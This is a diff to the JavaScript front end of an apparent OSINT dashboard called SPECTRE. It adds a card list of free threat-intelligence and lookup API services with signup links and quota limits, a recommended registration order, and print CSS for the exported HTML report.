+        ['Shodan',          'https://account.shodan.io/register',           '100 queries/month','Internet-connected devices, open ports, banners'],
+        ['GreyNoise',       'https://www.greynoise.io/signup',              '1000 IPs/month','Distinguish attack traffic from background noise'],
+        ['IPQualityScore',  'https://www.ipqualityscore.com/create-account','5000 lookups/month','Proxy/VPN/TOR detect, fraud scoring, email verify'],
+        ['URLScan.io',      'https://urlscan.io/user/signup/',              '100 scans/day','Deep URL analysis — screenshot, DOM, redirects'],
+        ['Censys',          'https://accounts.censys.io/register',         '250 queries/month','Internet scan data, certs, services, hosts'],
+        ['SecurityTrails',  'https://securitytrails.com/app/account/register','50 queries/month','Historical DNS, WHOIS history, subdomain enum'],
+        ['FullContact',     'https://platform.fullcontact.com/register',   '500 lookups/month','Email → identity (name, social, company)'],
+        ['WiGLE',           'https://wigle.net/account',                   'Free account','WiFi/cell network geolocation database'],
+        ['Shodan Exploits',  'https://exploit.shodan.io',                   'Free with Shodan','CVE/exploit search by product/version'],
+        ['Pulsedive',       'https://pulsedive.com/register/',             '30 lookups/day','Threat intel — IPs, URLs, domains, indicators'],
+      ].map(([name, signup, limit, desc]) => `
+      <div class="dc" style="margin-bottom:6px">
+        <div style="display:flex;justify-content:space-between;align-items:flex-start">
+          <div class="dv dv-hi" style="font-size:11px">${name}</div>
+          <span style="font-family:var(--mono);font-size:9px;color:var(--amber2);
+            background:rgba(245,166,35,.08);border:1px solid rgba(245,166,35,.25);
+            padding:1px 6px;border-radius:2px;flex-shrink:0;margin-left:6px">${limit}</span>
+        </div>
+        <div class="dl">${desc}</div>
+        <a href="${signup}" target="_blank"
+          style="display:inline-block;margin-top:4px;font-family:var(--mono);font-size:9px;
+          color:var(--cyan2);border:1px solid var(--line2);padding:1px 7px;border-radius:2px;
+          text-decoration:none">↗ Get Free Key</a>
+      </div>`).join('')}
+    </div></div>` +
+
+    // SETUP GUIDE
+    `<div class="sub"><div class="sub-hd">// 🚀 Quick Setup Guide</div>
+    <div style="background:var(--bg3);border:1px solid var(--line2);border-radius:5px;
+      padding:12px 14px;font-family:var(--mono);font-size:10px;color:var(--text2);line-height:2">
+      <strong style="color:var(--amber)">Recommended order to register:</strong><br>
+      1. <a href="https://virustotal.com/gui/sign-in" target="_blank" style="color:var(--cyan2)">VirusTotal</a> — most used, covers URLs/IPs/domains/files<br>
+      2. <a href="https://haveibeenpwned.com/API/Key" target="_blank" style="color:var(--cyan2)">HIBP</a> — breach database, £3.50/month but essential<br>
+      3. <a href="https://www.abuseipdb.com/register" target="_blank" style="color:var(--cyan2)">AbuseIPDB</a> — free, excellent for IP reputation<br>
+      4. <a href="https://www.ipqualityscore.com/create-account" target="_blank" style="color:var(--cyan2)">IPQualityScore</a> — free 5000/month, proxy/VPN/fraud detection<br>
+      5. <a href="https://account.shodan.io/register" target="_blank" style="color:var(--cyan2)">Shodan</a> — free tier gives device/port data<br>
+      6. <a href="https://numverify.com" target="_blank" style="color:var(--cyan2)">NumVerify</a> — free 250/month for phone carrier lookup<br>
+      <br>
+      <strong style="color:var(--amber)">After getting keys:</strong> Enter them in the sidebar → green dot confirms active
+    </div></div>`
+  );
+
+  pOk('build');
+  feed(`🔑 Free API reference loaded`, 'ok');
+  refreshStats();
+}
+
 /* ═══════════════════════════════════════════
    UI HELPERS
 ═══════════════════════════════════════════ */
@@ -3579,7 +5336,21 @@ function exportHTML(){
   const html=`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>SPECTRE Report</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Exo+2:wght@400;600;700;900&display=swap" rel="stylesheet">
     <style>*{margin:0;padding:0;box-sizing:border-box}body{background:#05070a;color:#c0dae8;font-family:'Exo 2',sans-serif;padding:20px;min-height:100vh}
-    ${style}</style></head><body>${body}</body></html>`;
+    ${style}
+@media print {
+  .sidebar,.topbar,nav,.search-zone,.right-panel,.modal-bg,.go-btn,.cpbtn,.save-btn { display:none!important; }
+  .workspace { margin:0!important; padding:10px!important; max-width:100%!important; }
+  .results-area { overflow:visible!important; }
+  .card { break-inside:avoid; page-break-inside:avoid; border:1px solid #ccc!important;
+    background:#fff!important; color:#000!important; margin:0 0 12px!important; }
+  .card-title,.sub-hd,.dl { color:#333!important; }
+  .dv,.dv-hi,.dv-ok,.dv-warn,.dv-bad { color:#000!important; }
+  a { color:#000!important; text-decoration:none!important; }
+  .pc,.pg { display:none!important; }
+  body { background:#fff!important; }
+}
+
+</style></head><body>${body}</body></html>`;
   dl(new Blob([html],{type:'text/html'}),`spectre-report-${Date.now()}.html`);
 }
 
